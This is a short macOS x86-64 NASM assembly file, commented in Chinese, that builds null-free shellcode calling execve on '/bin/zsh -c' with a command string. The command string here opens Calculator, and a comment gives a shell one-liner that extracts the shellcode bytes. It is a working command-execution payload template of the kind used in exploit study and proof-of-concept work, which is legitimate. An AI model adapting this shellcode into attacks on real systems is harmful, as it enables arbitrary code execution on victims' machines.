; nasm -f macho64 exec_cmd.asm
; ld -macosx_version_min 10.14 -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -lSystem -o exec_cmd exec_cmd.o

;; 和execve_cmd.asm的区别是，没有\x00
;; otool -t shellcode.o | grep 00 | cut -f2-17 -d " " | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'   

BITS        64
global      _main

section     .text
_main:
    push    59
    pop     rax         ; eax = sys_execve
    cdq                 ; edx = 0
    bts     eax, 25     ; eax = 0x0200003B
    mov     rbx, '/bin/zsh'
    push    rdx         ; 0
    push    rbx         ; "/bin//zsh"
    push    rsp
    pop     rdi         ; rdi="/bin/zsh", 0
    ; ---------
    push    rdx         ; 0
    push    word '-c'
    push    rsp
    pop     rbx         ; rbx="-c", 0
    push    rdx         ; argv[3]=NULL
    jmp     l_cmd64
r_cmd64:                ; argv[2]=cmd
    push    rbx         ; argv[1]="-c"
    push    rdi         ; argv[0]="/bin/zsh"
    push    rsp
    pop     rsi         ; rsi=argv
    syscall
l_cmd64:
    call    r_cmd64
    db 'open /System/Applications/Calculator.app', 0